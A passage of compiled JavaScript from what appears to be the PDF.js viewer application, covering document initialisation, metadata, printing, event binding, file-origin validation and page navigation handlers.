    this.toolbar.setPagesCount(pdfDocument.numPages, false);
    this.secondaryToolbar.setPagesCount(pdfDocument.numPages);
    let baseDocumentUrl;
    baseDocumentUrl = null;
    this.pdfLinkService.setDocument(pdfDocument, baseDocumentUrl);
    this.pdfDocumentProperties.setDocument(pdfDocument, this.url);
    const pdfViewer = this.pdfViewer;
    pdfViewer.setDocument(pdfDocument);
    const {
      firstPagePromise,
      onePageRendered,
      pagesPromise
    } = pdfViewer;
    const pdfThumbnailViewer = this.pdfThumbnailViewer;
    pdfThumbnailViewer.setDocument(pdfDocument);
    const storedPromise = (this.store = new _view_history.ViewHistory(pdfDocument.fingerprint)).getMultiple({
      page: null,
      zoom: _ui_utils.DEFAULT_SCALE_VALUE,
      scrollLeft: "0",
      scrollTop: "0",
      rotation: null,
      sidebarView: _pdf_sidebar.SidebarView.UNKNOWN,
      scrollMode: _ui_utils.ScrollMode.UNKNOWN,
      spreadMode: _ui_utils.SpreadMode.UNKNOWN
    }).catch(() => {
      return Object.create(null);
    });
    firstPagePromise.then(pdfPage => {
      this.loadingBar.setWidth(this.appConfig.viewerContainer);
      Promise.all([_ui_utils.animationStarted, storedPromise, pageLayoutPromise, pageModePromise, openActionPromise]).then(async ([timeStamp, stored, pageLayout, pageMode, openAction]) => {
        const viewOnLoad = _app_options.AppOptions.get("viewOnLoad");

        this._initializePdfHistory({
          fingerprint: pdfDocument.fingerprint,
          viewOnLoad,
          initialDest: openAction && openAction.dest
        });

        const initialBookmark = this.initialBookmark;

        const zoom = _app_options.AppOptions.get("defaultZoomValue");

        let hash = zoom ? `zoom=${zoom}` : null;
        let rotation = null;

        let sidebarView = _app_options.AppOptions.get("sidebarViewOnLoad");

        let scrollMode = _app_options.AppOptions.get("scrollModeOnLoad");

        let spreadMode = _app_options.AppOptions.get("spreadModeOnLoad");

        if (stored.page && viewOnLoad !== ViewOnLoad.INITIAL) {
          hash = `page=${stored.page}&zoom=${zoom || stored.zoom},` + `${stored.scrollLeft},${stored.scrollTop}`;
          rotation = parseInt(stored.rotation, 10);

          if (sidebarView === _pdf_sidebar.SidebarView.UNKNOWN) {
            sidebarView = stored.sidebarView | 0;
          }

          if (scrollMode === _ui_utils.ScrollMode.UNKNOWN) {
            scrollMode = stored.scrollMode | 0;
          }

          if (spreadMode === _ui_utils.SpreadMode.UNKNOWN) {
            spreadMode = stored.spreadMode | 0;
          }
        }

        if (pageMode && sidebarView === _pdf_sidebar.SidebarView.UNKNOWN) {
          sidebarView = apiPageModeToSidebarView(pageMode);
        }

        if (pageLayout && spreadMode === _ui_utils.SpreadMode.UNKNOWN) {
          spreadMode = apiPageLayoutToSpreadMode(pageLayout);
        }

        this.setInitialView(hash, {
          rotation,
          sidebarView,
          scrollMode,
          spreadMode
        });
        this.eventBus.dispatch("documentinit", {
          source: this
        });

        if (!this.isViewerEmbedded) {
          pdfViewer.focus();
        }

        this._initializePermissions(pdfDocument);

        await Promise.race([pagesPromise, new Promise(resolve => {
          setTimeout(resolve, FORCE_PAGES_LOADED_TIMEOUT);
        })]);

        if (!initialBookmark && !hash) {
          return;
        }

        if (pdfViewer.hasEqualPageSizes) {
          return;
        }

        this.initialBookmark = initialBookmark;
        pdfViewer.currentScaleValue = pdfViewer.currentScaleValue;
        this.setInitialView(hash);
      }).catch(() => {
        this.setInitialView();
      }).then(function () {
        pdfViewer.update();
      });
    });
    pagesPromise.then(() => {
      this._initializeAutoPrint(pdfDocument, openActionPromise);
    });
    onePageRendered.then(() => {
      pdfDocument.getOutline().then(outline => {
        this.pdfOutlineViewer.render({
          outline
        });
      });
      pdfDocument.getAttachments().then(attachments => {
        this.pdfAttachmentViewer.render({
          attachments
        });
      });
    });

    this._initializePageLabels(pdfDocument);

    this._initializeMetadata(pdfDocument);
  },

  async _initializeAutoPrint(pdfDocument, openActionPromise) {
    const [openAction, javaScript] = await Promise.all([openActionPromise, pdfDocument.getJavaScript()]);

    if (pdfDocument !== this.pdfDocument) {
      return;
    }

    let triggerAutoPrint = false;

    if (openAction && openAction.action === "Print") {
      triggerAutoPrint = true;
    }

    if (javaScript) {
      javaScript.some(js => {
        if (!js) {
          return false;
        }

        console.warn("Warning: JavaScript is not supported");
        this.fallback(_pdfjsLib.UNSUPPORTED_FEATURES.javaScript);
        return true;
      });

      if (!triggerAutoPrint) {
        for (const js of javaScript) {
          if (js && _ui_utils.AutoPrintRegExp.test(js)) {
            triggerAutoPrint = true;
            break;
          }
        }
      }
    }

    if (!this.supportsPrinting) {
      return;
    }

    if (triggerAutoPrint) {
      setTimeout(function () {
        window.print();
      });
    }
  },

  async _initializeMetadata(pdfDocument) {
    const {
      info,
      metadata,
      contentDispositionFilename
    } = await pdfDocument.getMetadata();

    if (pdfDocument !== this.pdfDocument) {
      return;
    }

    this.documentInfo = info;
    this.metadata = metadata;
    this.contentDispositionFilename = contentDispositionFilename;
    console.log(`PDF ${pdfDocument.fingerprint} [${info.PDFFormatVersion} ` + `${(info.Producer || "-").trim()} / ${(info.Creator || "-").trim()}] ` + `(PDF.js: ${_pdfjsLib.version || "-"}` + `${this.pdfViewer.enableWebGL ? " [WebGL]" : ""})`);
    let pdfTitle;
    const infoTitle = info && info.Title;

    if (infoTitle) {
      pdfTitle = infoTitle;
    }

    const metadataTitle = metadata && metadata.get("dc:title");

    if (metadataTitle) {
      if (metadataTitle !== "Untitled" && !/[\uFFF0-\uFFFF]/g.test(metadataTitle)) {
        pdfTitle = metadataTitle;
      }
    }

    if (pdfTitle) {
      this.setTitle(`${pdfTitle} - ${contentDispositionFilename || document.title}`);
    } else if (contentDispositionFilename) {
      this.setTitle(contentDispositionFilename);
    }

    if (info.IsAcroFormPresent) {
      console.warn("Warning: AcroForm/XFA is not supported");
      this.fallback(_pdfjsLib.UNSUPPORTED_FEATURES.forms);
    }

    let versionId = "other";
    const KNOWN_VERSIONS = ["1.0", "1.1", "1.2", "1.3", "1.4", "1.5", "1.6", "1.7", "1.8", "1.9", "2.0", "2.1", "2.2", "2.3"];

    if (KNOWN_VERSIONS.includes(info.PDFFormatVersion)) {
      versionId = `v${info.PDFFormatVersion.replace(".", "_")}`;
    }

    let generatorId = "other";
    const KNOWN_GENERATORS = ["acrobat distiller", "acrobat pdfwriter", "adobe livecycle", "adobe pdf library", "adobe photoshop", "ghostscript", "tcpdf", "cairo", "dvipdfm", "dvips", "pdftex", "pdfkit", "itext", "prince", "quarkxpress", "mac os x", "microsoft", "openoffice", "oracle", "luradocument", "pdf-xchange", "antenna house", "aspose.cells", "fpdf"];

    if (info.Producer) {
      const producer = info.Producer.toLowerCase();
      KNOWN_GENERATORS.some(function (generator) {
        if (!producer.includes(generator)) {
          return false;
        }

        generatorId = generator.replace(/[ .\-]/g, "_");
        return true;
      });
    }

    let formType = null;

    if (info.IsAcroFormPresent) {
      formType = info.IsXFAPresent ? "xfa" : "acroform";
    }

    this.externalServices.reportTelemetry({
      type: "documentInfo",
      version: versionId,
      generator: generatorId,
      formType
    });
  },

  async _initializePageLabels(pdfDocument) {
    const labels = await pdfDocument.getPageLabels();

    if (pdfDocument !== this.pdfDocument) {
      return;
    }

    if (!labels || _app_options.AppOptions.get("disablePageLabels")) {
      return;
    }

    const numLabels = labels.length;

    if (numLabels !== this.pagesCount) {
      console.error("The number of Page Labels does not match the number of pages in the document.");
      return;
    }

    let i = 0;

    while (i < numLabels && labels[i] === (i + 1).toString()) {
      i++;
    }

    if (i === numLabels) {
      return;
    }

    const {
      pdfViewer,
      pdfThumbnailViewer,
      toolbar
    } = this;
    pdfViewer.setPageLabels(labels);
    pdfThumbnailViewer.setPageLabels(labels);
    toolbar.setPagesCount(numLabels, true);
    toolbar.setPageNumber(pdfViewer.currentPageNumber, pdfViewer.currentPageLabel);
  },

  _initializePdfHistory({
    fingerprint,
    viewOnLoad,
    initialDest = null
  }) {
    if (this.isViewerEmbedded || _app_options.AppOptions.get("disableHistory")) {
      return;
    }

    this.pdfHistory.initialize({
      fingerprint,
      resetHistory: viewOnLoad === ViewOnLoad.INITIAL,
      updateUrl: _app_options.AppOptions.get("historyUpdateUrl")
    });

    if (this.pdfHistory.initialBookmark) {
      this.initialBookmark = this.pdfHistory.initialBookmark;
      this.initialRotation = this.pdfHistory.initialRotation;
    }

    if (initialDest && !this.initialBookmark && viewOnLoad === ViewOnLoad.UNKNOWN) {
      this.initialBookmark = JSON.stringify(initialDest);
      this.pdfHistory.push({
        explicitDest: initialDest,
        pageNumber: null
      });
    }
  },

  async _initializePermissions(pdfDocument) {
    const permissions = await pdfDocument.getPermissions();

    if (pdfDocument !== this.pdfDocument) {
      return;
    }

    if (!permissions || !_app_options.AppOptions.get("enablePermissions")) {
      return;
    }

    if (!permissions.includes(_pdfjsLib.PermissionFlag.COPY)) {
      this.appConfig.viewerContainer.classList.add(ENABLE_PERMISSIONS_CLASS);
    }
  },

  setInitialView(storedHash, {
    rotation,
    sidebarView,
    scrollMode,
    spreadMode
  } = {}) {
    const setRotation = angle => {
      if ((0, _ui_utils.isValidRotation)(angle)) {
        this.pdfViewer.pagesRotation = angle;
      }
    };

    const setViewerModes = (scroll, spread) => {
      if ((0, _ui_utils.isValidScrollMode)(scroll)) {
        this.pdfViewer.scrollMode = scroll;
      }

      if ((0, _ui_utils.isValidSpreadMode)(spread)) {
        this.pdfViewer.spreadMode = spread;
      }
    };

    this.isInitialViewSet = true;
    this.pdfSidebar.setInitialView(sidebarView);
    setViewerModes(scrollMode, spreadMode);

    if (this.initialBookmark) {
      setRotation(this.initialRotation);
      delete this.initialRotation;
      this.pdfLinkService.setHash(this.initialBookmark);
      this.initialBookmark = null;
    } else if (storedHash) {
      setRotation(rotation);
      this.pdfLinkService.setHash(storedHash);
    }

    this.toolbar.setPageNumber(this.pdfViewer.currentPageNumber, this.pdfViewer.currentPageLabel);
    this.secondaryToolbar.setPageNumber(this.pdfViewer.currentPageNumber);

    if (!this.pdfViewer.currentScaleValue) {
      this.pdfViewer.currentScaleValue = _ui_utils.DEFAULT_SCALE_VALUE;
    }
  },

  cleanup() {
    if (!this.pdfDocument) {
      return;
    }

    this.pdfViewer.cleanup();
    this.pdfThumbnailViewer.cleanup();

    if (this.pdfViewer.renderer !== _ui_utils.RendererType.SVG) {
      this.pdfDocument.cleanup();
    }
  },

  forceRendering() {
    this.pdfRenderingQueue.printing = this.printing;
    this.pdfRenderingQueue.isThumbnailViewEnabled = this.pdfSidebar.isThumbnailViewVisible;
    this.pdfRenderingQueue.renderHighestPriority();
  },

  beforePrint() {
    if (this.printService) {
      return;
    }

    if (!this.supportsPrinting) {
      this.l10n.get("printing_not_supported", null, "Warning: Printing is not fully supported by this browser.").then(printMessage => {
        this.error(printMessage);
      });
      return;
    }

    if (!this.pdfViewer.pageViewsReady) {
      this.l10n.get("printing_not_ready", null, "Warning: The PDF is not fully loaded for printing.").then(notReadyMessage => {
        window.alert(notReadyMessage);
      });
      return;
    }

    const pagesOverview = this.pdfViewer.getPagesOverview();
    const printContainer = this.appConfig.printContainer;
    const printService = PDFPrintServiceFactory.instance.createPrintService(this.pdfDocument, pagesOverview, printContainer, this.l10n);
    this.printService = printService;
    this.forceRendering();
    printService.layout();
    this.externalServices.reportTelemetry({
      type: "print"
    });
  },

  afterPrint() {
    if (this.printService) {
      this.printService.destroy();
      this.printService = null;
    }

    this.forceRendering();
  },

  rotatePages(delta) {
    if (!this.pdfDocument) {
      return;
    }

    const newRotation = (this.pdfViewer.pagesRotation + 360 + delta) % 360;
    this.pdfViewer.pagesRotation = newRotation;
  },

  requestPresentationMode() {
    if (!this.pdfPresentationMode) {
      return;
    }

    this.pdfPresentationMode.request();
  },

  bindEvents() {
    const {
      eventBus,
      _boundEvents
    } = this;
    _boundEvents.beforePrint = this.beforePrint.bind(this);
    _boundEvents.afterPrint = this.afterPrint.bind(this);

    eventBus._on("resize", webViewerResize);

    eventBus._on("hashchange", webViewerHashchange);

    eventBus._on("beforeprint", _boundEvents.beforePrint);

    eventBus._on("afterprint", _boundEvents.afterPrint);

    eventBus._on("pagerendered", webViewerPageRendered);

    eventBus._on("updateviewarea", webViewerUpdateViewarea);

    eventBus._on("pagechanging", webViewerPageChanging);

    eventBus._on("scalechanging", webViewerScaleChanging);

    eventBus._on("rotationchanging", webViewerRotationChanging);

    eventBus._on("sidebarviewchanged", webViewerSidebarViewChanged);

    eventBus._on("pagemode", webViewerPageMode);

    eventBus._on("namedaction", webViewerNamedAction);

    eventBus._on("presentationmodechanged", webViewerPresentationModeChanged);

    eventBus._on("presentationmode", webViewerPresentationMode);

    eventBus._on("print", webViewerPrint);

    eventBus._on("download", webViewerDownload);

    eventBus._on("firstpage", webViewerFirstPage);

    eventBus._on("lastpage", webViewerLastPage);

    eventBus._on("nextpage", webViewerNextPage);

    eventBus._on("previouspage", webViewerPreviousPage);

    eventBus._on("zoomin", webViewerZoomIn);

    eventBus._on("zoomout", webViewerZoomOut);

    eventBus._on("zoomreset", webViewerZoomReset);

    eventBus._on("pagenumberchanged", webViewerPageNumberChanged);

    eventBus._on("scalechanged", webViewerScaleChanged);

    eventBus._on("rotatecw", webViewerRotateCw);

    eventBus._on("rotateccw", webViewerRotateCcw);

    eventBus._on("switchscrollmode", webViewerSwitchScrollMode);

    eventBus._on("scrollmodechanged", webViewerScrollModeChanged);

    eventBus._on("switchspreadmode", webViewerSwitchSpreadMode);

    eventBus._on("spreadmodechanged", webViewerSpreadModeChanged);

    eventBus._on("documentproperties", webViewerDocumentProperties);

    eventBus._on("find", webViewerFind);

    eventBus._on("findfromurlhash", webViewerFindFromUrlHash);

    eventBus._on("updatefindmatchescount", webViewerUpdateFindMatchesCount);

    eventBus._on("updatefindcontrolstate", webViewerUpdateFindControlState);

    eventBus._on("fileinputchange", webViewerFileInputChange);

    eventBus._on("openfile", webViewerOpenFile);
  },

  bindWindowEvents() {
    const {
      eventBus,
      _boundEvents
    } = this;

    _boundEvents.windowResize = () => {
      eventBus.dispatch("resize", {
        source: window
      });
    };

    _boundEvents.windowHashChange = () => {
      eventBus.dispatch("hashchange", {
        source: window,
        hash: document.location.hash.substring(1)
      });
    };

    _boundEvents.windowBeforePrint = () => {
      eventBus.dispatch("beforeprint", {
        source: window
      });
    };

    _boundEvents.windowAfterPrint = () => {
      eventBus.dispatch("afterprint", {
        source: window
      });
    };

    window.addEventListener("visibilitychange", webViewerVisibilityChange);
    window.addEventListener("wheel", webViewerWheel, {
      passive: false
    });
    window.addEventListener("click", webViewerClick);
    window.addEventListener("keydown", webViewerKeyDown);
    window.addEventListener("resize", _boundEvents.windowResize);
    window.addEventListener("hashchange", _boundEvents.windowHashChange);
    window.addEventListener("beforeprint", _boundEvents.windowBeforePrint);
    window.addEventListener("afterprint", _boundEvents.windowAfterPrint);
  },

  unbindEvents() {
    const {
      eventBus,
      _boundEvents
    } = this;

    eventBus._off("resize", webViewerResize);

    eventBus._off("hashchange", webViewerHashchange);

    eventBus._off("beforeprint", _boundEvents.beforePrint);

    eventBus._off("afterprint", _boundEvents.afterPrint);

    eventBus._off("pagerendered", webViewerPageRendered);

    eventBus._off("updateviewarea", webViewerUpdateViewarea);

    eventBus._off("pagechanging", webViewerPageChanging);

    eventBus._off("scalechanging", webViewerScaleChanging);

    eventBus._off("rotationchanging", webViewerRotationChanging);

    eventBus._off("sidebarviewchanged", webViewerSidebarViewChanged);

    eventBus._off("pagemode", webViewerPageMode);

    eventBus._off("namedaction", webViewerNamedAction);

    eventBus._off("presentationmodechanged", webViewerPresentationModeChanged);

    eventBus._off("presentationmode", webViewerPresentationMode);

    eventBus._off("print", webViewerPrint);

    eventBus._off("download", webViewerDownload);

    eventBus._off("firstpage", webViewerFirstPage);

    eventBus._off("lastpage", webViewerLastPage);

    eventBus._off("nextpage", webViewerNextPage);

    eventBus._off("previouspage", webViewerPreviousPage);

    eventBus._off("zoomin", webViewerZoomIn);

    eventBus._off("zoomout", webViewerZoomOut);

    eventBus._off("zoomreset", webViewerZoomReset);

    eventBus._off("pagenumberchanged", webViewerPageNumberChanged);

    eventBus._off("scalechanged", webViewerScaleChanged);

    eventBus._off("rotatecw", webViewerRotateCw);

    eventBus._off("rotateccw", webViewerRotateCcw);

    eventBus._off("switchscrollmode", webViewerSwitchScrollMode);

    eventBus._off("scrollmodechanged", webViewerScrollModeChanged);

    eventBus._off("switchspreadmode", webViewerSwitchSpreadMode);

    eventBus._off("spreadmodechanged", webViewerSpreadModeChanged);

    eventBus._off("documentproperties", webViewerDocumentProperties);

    eventBus._off("find", webViewerFind);

    eventBus._off("findfromurlhash", webViewerFindFromUrlHash);

    eventBus._off("updatefindmatchescount", webViewerUpdateFindMatchesCount);

    eventBus._off("updatefindcontrolstate", webViewerUpdateFindControlState);

    eventBus._off("fileinputchange", webViewerFileInputChange);

    eventBus._off("openfile", webViewerOpenFile);

    _boundEvents.beforePrint = null;
    _boundEvents.afterPrint = null;
  },

  unbindWindowEvents() {
    const {
      _boundEvents
    } = this;
    window.removeEventListener("visibilitychange", webViewerVisibilityChange);
    window.removeEventListener("wheel", webViewerWheel, {
      passive: false
    });
    window.removeEventListener("click", webViewerClick);
    window.removeEventListener("keydown", webViewerKeyDown);
    window.removeEventListener("resize", _boundEvents.windowResize);
    window.removeEventListener("hashchange", _boundEvents.windowHashChange);
    window.removeEventListener("beforeprint", _boundEvents.windowBeforePrint);
    window.removeEventListener("afterprint", _boundEvents.windowAfterPrint);
    _boundEvents.windowResize = null;
    _boundEvents.windowHashChange = null;
    _boundEvents.windowBeforePrint = null;
    _boundEvents.windowAfterPrint = null;
  }

};
exports.PDFViewerApplication = PDFViewerApplication;
let validateFileURL;
{
  const HOSTED_VIEWER_ORIGINS = ["null", "http://mozilla.github.io", "https://mozilla.github.io"];

  validateFileURL = function (file) {
    if (file === undefined) {
      return;
    }

    try {
      const viewerOrigin = new URL(window.location.href).origin || "null";

      if (HOSTED_VIEWER_ORIGINS.includes(viewerOrigin)) {
        return;
      }

      const {
        origin,
        protocol
      } = new URL(file, window.location.href);

      if (origin !== viewerOrigin && protocol !== "blob:") {
        throw new Error("file origin does not match viewer's");
      }
    } catch (ex) {
      const message = ex && ex.message;
      PDFViewerApplication.l10n.get("loading_error", null, "An error occurred while loading the PDF.").then(loadingErrorMessage => {
        PDFViewerApplication.error(loadingErrorMessage, {
          message
        });
      });
      throw ex;
    }
  };
}

async function loadFakeWorker() {
  if (!_pdfjsLib.GlobalWorkerOptions.workerSrc) {
    _pdfjsLib.GlobalWorkerOptions.workerSrc = _app_options.AppOptions.get("workerSrc");
  }

  return (0, _pdfjsLib.loadScript)(_pdfjsLib.PDFWorker.getWorkerSrc());
}

function loadAndEnablePDFBug(enabledTabs) {
  const appConfig = PDFViewerApplication.appConfig;
  return (0, _pdfjsLib.loadScript)(appConfig.debuggerScriptPath).then(function () {
    PDFBug.enable(enabledTabs);
    PDFBug.init({
      OPS: _pdfjsLib.OPS
    }, appConfig.mainContainer);
  });
}

function webViewerInitialized() {
  const appConfig = PDFViewerApplication.appConfig;
  let file;
  const queryString = document.location.search.substring(1);
  const params = (0, _ui_utils.parseQueryString)(queryString);
  file = "file" in params ? params.file : _app_options.AppOptions.get("defaultUrl");
  validateFileURL(file);
  const fileInput = document.createElement("input");
  fileInput.id = appConfig.openFileInputName;
  fileInput.className = "fileInput";
  fileInput.setAttribute("type", "file");
  fileInput.oncontextmenu = _ui_utils.noContextMenuHandler;
  document.body.appendChild(fileInput);

  if (!window.File || !window.FileReader || !window.FileList || !window.Blob) {
    appConfig.toolbar.openFile.setAttribute("hidden", "true");
    appConfig.secondaryToolbar.openFileButton.setAttribute("hidden", "true");
  } else {
    fileInput.value = null;
  }

  fileInput.addEventListener("change", function (evt) {
    const files = evt.target.files;

    if (!files || files.length === 0) {
      return;
    }

    PDFViewerApplication.eventBus.dispatch("fileinputchange", {
      source: this,
      fileInput: evt.target
    });
  });
  appConfig.mainContainer.addEventListener("dragover", function (evt) {
    evt.preventDefault();
    evt.dataTransfer.dropEffect = "move";
  });
  appConfig.mainContainer.addEventListener("drop", function (evt) {
    evt.preventDefault();
    const files = evt.dataTransfer.files;

    if (!files || files.length === 0) {
      return;
    }

    PDFViewerApplication.eventBus.dispatch("fileinputchange", {
      source: this,
      fileInput: evt.dataTransfer
    });
  });

  if (!PDFViewerApplication.supportsDocumentFonts) {
    _app_options.AppOptions.set("disableFontFace", true);

    PDFViewerApplication.l10n.get("web_fonts_disabled", null, "Web fonts are disabled: unable to use embedded PDF fonts.").then(msg => {
      console.warn(msg);
    });
  }

  if (!PDFViewerApplication.supportsPrinting) {
    appConfig.toolbar.print.classList.add("hidden");
    appConfig.secondaryToolbar.printButton.classList.add("hidden");
  }

  if (!PDFViewerApplication.supportsFullscreen) {
    appConfig.toolbar.presentationModeButton.classList.add("hidden");
    appConfig.secondaryToolbar.presentationModeButton.classList.add("hidden");
  }

  if (PDFViewerApplication.supportsIntegratedFind) {
    appConfig.toolbar.viewFind.classList.add("hidden");
  }

  appConfig.mainContainer.addEventListener("transitionend", function (evt) {
    if (evt.target === this) {
      PDFViewerApplication.eventBus.dispatch("resize", {
        source: this
      });
    }
  }, true);

  try {
    webViewerOpenFileViaURL(file);
  } catch (reason) {
    PDFViewerApplication.l10n.get("loading_error", null, "An error occurred while loading the PDF.").then(msg => {
      PDFViewerApplication.error(msg, reason);
    });
  }
}

let webViewerOpenFileViaURL;
{
  webViewerOpenFileViaURL = function (file) {
    if (file && file.lastIndexOf("file:", 0) === 0) {
      PDFViewerApplication.setTitleUsingUrl(file);
      const xhr = new XMLHttpRequest();

      xhr.onload = function () {
        PDFViewerApplication.open(new Uint8Array(xhr.response));
      };

      xhr.open("GET", file);
      xhr.responseType = "arraybuffer";
      xhr.send();
      return;
    }

    if (file) {
      PDFViewerApplication.open(file);
    }
  };
}

function webViewerResetPermissions() {
  const {
    appConfig
  } = PDFViewerApplication;

  if (!appConfig) {
    return;
  }

  appConfig.viewerContainer.classList.remove(ENABLE_PERMISSIONS_CLASS);
}

function webViewerPageRendered(evt) {
  const pageNumber = evt.pageNumber;
  const pageIndex = pageNumber - 1;
  const pageView = PDFViewerApplication.pdfViewer.getPageView(pageIndex);

  if (pageNumber === PDFViewerApplication.page) {
    PDFViewerApplication.toolbar.updateLoadingIndicatorState(false);
  }

  if (!pageView) {
    return;
  }

  if (PDFViewerApplication.pdfSidebar.isThumbnailViewVisible) {
    const thumbnailView = PDFViewerApplication.pdfThumbnailViewer.getThumbnail(pageIndex);
    thumbnailView.setImage(pageView);
  }

  if (typeof Stats !== "undefined" && Stats.enabled && pageView.stats) {
    Stats.add(pageNumber, pageView.stats);
  }

  if (pageView.error) {
    PDFViewerApplication.l10n.get("rendering_error", null, "An error occurred while rendering the page.").then(msg => {
      PDFViewerApplication.error(msg, pageView.error);
    });
  }

  PDFViewerApplication.externalServices.reportTelemetry({
    type: "pageInfo",
    timestamp: evt.timestamp
  });
  PDFViewerApplication.pdfDocument.getStats().then(function (stats) {
    PDFViewerApplication.externalServices.reportTelemetry({
      type: "documentStats",
      stats
    });
  });
}

function webViewerPageMode({
  mode
}) {
  let view;

  switch (mode) {
    case "thumbs":
      view = _pdf_sidebar.SidebarView.THUMBS;
      break;

    case "bookmarks":
    case "outline":
      view = _pdf_sidebar.SidebarView.OUTLINE;
      break;

    case "attachments":
      view = _pdf_sidebar.SidebarView.ATTACHMENTS;
      break;

    case "none":
      view = _pdf_sidebar.SidebarView.NONE;
      break;

    default:
      console.error('Invalid "pagemode" hash parameter: ' + mode);
      return;
  }

  PDFViewerApplication.pdfSidebar.switchView(view, true);
}

function webViewerNamedAction(evt) {
  const action = evt.action;

  switch (action) {
    case "GoToPage":
      PDFViewerApplication.appConfig.toolbar.pageNumber.select();
      break;

    case "Find":
      if (!PDFViewerApplication.supportsIntegratedFind) {
        PDFViewerApplication.findBar.toggle();
      }

      break;
  }
}

function webViewerPresentationModeChanged({
  active,
  switchInProgress
}) {
  let state = _ui_utils.PresentationModeState.NORMAL;

  if (switchInProgress) {
    state = _ui_utils.PresentationModeState.CHANGING;
  } else if (active) {
    state = _ui_utils.PresentationModeState.FULLSCREEN;
  }

  PDFViewerApplication.pdfViewer.presentationModeState = state;
}

function webViewerSidebarViewChanged(evt) {
  PDFViewerApplication.pdfRenderingQueue.isThumbnailViewEnabled = PDFViewerApplication.pdfSidebar.isThumbnailViewVisible;
  const store = PDFViewerApplication.store;

  if (store && PDFViewerApplication.isInitialViewSet) {
    store.set("sidebarView", evt.view).catch(function () {});
  }
}

function webViewerUpdateViewarea(evt) {
  const location = evt.location,
        store = PDFViewerApplication.store;

  if (store && PDFViewerApplication.isInitialViewSet) {
    store.setMultiple({
      page: location.pageNumber,
      zoom: location.scale,
      scrollLeft: location.left,
      scrollTop: location.top,
      rotation: location.rotation
    }).catch(function () {});
  }

  const href = PDFViewerApplication.pdfLinkService.getAnchorUrl(location.pdfOpenParams);
  PDFViewerApplication.appConfig.toolbar.viewBookmark.href = href;
  PDFViewerApplication.appConfig.secondaryToolbar.viewBookmarkButton.href = href;
  const currentPage = PDFViewerApplication.pdfViewer.getPageView(PDFViewerApplication.page - 1);
  const loading = currentPage.renderingState !== _pdf_rendering_queue.RenderingStates.FINISHED;
  PDFViewerApplication.toolbar.updateLoadingIndicatorState(loading);
}

function webViewerScrollModeChanged(evt) {
  const store = PDFViewerApplication.store;

  if (store && PDFViewerApplication.isInitialViewSet) {
    store.set("scrollMode", evt.mode).catch(function () {});
  }
}

function webViewerSpreadModeChanged(evt) {
  const store = PDFViewerApplication.store;

  if (store && PDFViewerApplication.isInitialViewSet) {
    store.set("spreadMode", evt.mode).catch(function () {});
  }
}

function webViewerResize() {
  const {
    pdfDocument,
    pdfViewer
  } = PDFViewerApplication;

  if (!pdfDocument) {
    return;
  }

  const currentScaleValue = pdfViewer.currentScaleValue;

  if (currentScaleValue === "auto" || currentScaleValue === "page-fit" || currentScaleValue === "page-width") {
    pdfViewer.currentScaleValue = currentScaleValue;
  }

  pdfViewer.update();
}

function webViewerHashchange(evt) {
  const hash = evt.hash;

  if (!hash) {
    return;
  }

  if (!PDFViewerApplication.isInitialViewSet) {
    PDFViewerApplication.initialBookmark = hash;
  } else if (!PDFViewerApplication.pdfHistory.popStateInProgress) {
    PDFViewerApplication.pdfLinkService.setHash(hash);
  }
}

let webViewerFileInputChange, webViewerOpenFile;
{
  webViewerFileInputChange = function (evt) {
    if (PDFViewerApplication.pdfViewer && PDFViewerApplication.pdfViewer.isInPresentationMode) {
      return;
    }

    const file = evt.fileInput.files[0];

    if (!_app_options.AppOptions.get("disableCreateObjectURL")) {
      let url = URL.createObjectURL(file);

      if (file.name) {
        url = {
          url,
          originalUrl: file.name
        };
      }

      PDFViewerApplication.open(url);
    } else {
      PDFViewerApplication.setTitleUsingUrl(file.name);
      const fileReader = new FileReader();

      fileReader.onload = function webViewerChangeFileReaderOnload(event) {
        const buffer = event.target.result;
        PDFViewerApplication.open(new Uint8Array(buffer));
      };

      fileReader.readAsArrayBuffer(file);
    }

    const appConfig = PDFViewerApplication.appConfig;
    appConfig.toolbar.viewBookmark.setAttribute("hidden", "true");
    appConfig.secondaryToolbar.viewBookmarkButton.setAttribute("hidden", "true");
    appConfig.toolbar.download.setAttribute("hidden", "true");
    appConfig.secondaryToolbar.downloadButton.setAttribute("hidden", "true");
  };

  webViewerOpenFile = function (evt) {
    const openFileInputName = PDFViewerApplication.appConfig.openFileInputName;
    document.getElementById(openFileInputName).click();
  };
}

function webViewerPresentationMode() {
  PDFViewerApplication.requestPresentationMode();
}

function webViewerPrint() {
  window.print();
}

function webViewerDownload() {
  PDFViewerApplication.download();
}

function webViewerFirstPage() {
  if (PDFViewerApplication.pdfDocument) {
    PDFViewerApplication.page = 1;
  }
}

function webViewerLastPage() {
  if (PDFViewerApplication.pdfDocument) {
    PDFViewerApplication.page = PDFViewerApplication.pagesCount;
  }
}

function webViewerNextPage() {
  PDFViewerApplication.page++;
}

function webViewerPreviousPage() {
  PDFViewerApplication.page--;
}

function webViewerZoomIn() {
  PDFViewerApplication.zoomIn();
}

function webViewerZoomOut() {
  PDFViewerApplication.zoomOut();
}

function webViewerZoomReset() {
  PDFViewerApplication.zoomReset();
}

function webViewerPageNumberChanged(evt) {
  const pdfViewer = PDFViewerApplication.pdfViewer;

  if (evt.value !== "") {
    pdfViewer.currentPageLabel = evt.value;
  }

  if (evt.value !== pdfViewer.currentPageNumber.toString() && evt.value !== pdfViewer.currentPageLabel) {
    PDFViewerApplication.toolbar.setPageNumber(pdfViewer.currentPageNumber, pdfViewer.currentPageLabel);
  }
}

function webViewerScaleChanged(evt) {
  PDFViewerApplication.pdfViewer.currentScaleValue = evt.value;
}

function webViewerRotateCw() {
  PDFViewerApplication.rotatePages(90);
}

function webViewerRotateCcw() {
  PDFViewerApplication.rotatePages(-90);
}

function webViewerSwitchScrollMode(evt) {
  PDFViewerApplication.pdfViewer.scrollMode = evt.mode;
}

function webViewerSwitchSpreadMode(evt) {
  PDFViewerApplication.pdfViewer.spreadMode = evt.mode;
}

function webViewerDocumentProperties() {
  PDFViewerApplication.pdfDocumentProperties.open();
}

function webViewerFind(evt) {
  PDFViewerApplication.findController.executeCommand("find" + evt.type, {
    query: evt.query,
    phraseSearch: evt.phraseSearch,
    caseSensitive: evt.caseSensitive,
    entireWord: evt.entireWord,
    highlightAll: evt.highlightAll,
    findPrevious: evt.findPrevious
  });
}

function webViewerFindFromUrlHash(evt) {
  PDFViewerApplication.findController.executeCommand("find", {
    query: evt.query,
    phraseSearch: evt.phraseSearch,
    caseSensitive: false,
    entireWord: false,
    highlightAll: true,
    findPrevious: false
  });
}

function webViewerUpdateFindMatchesCount({
  matchesCount
}) {
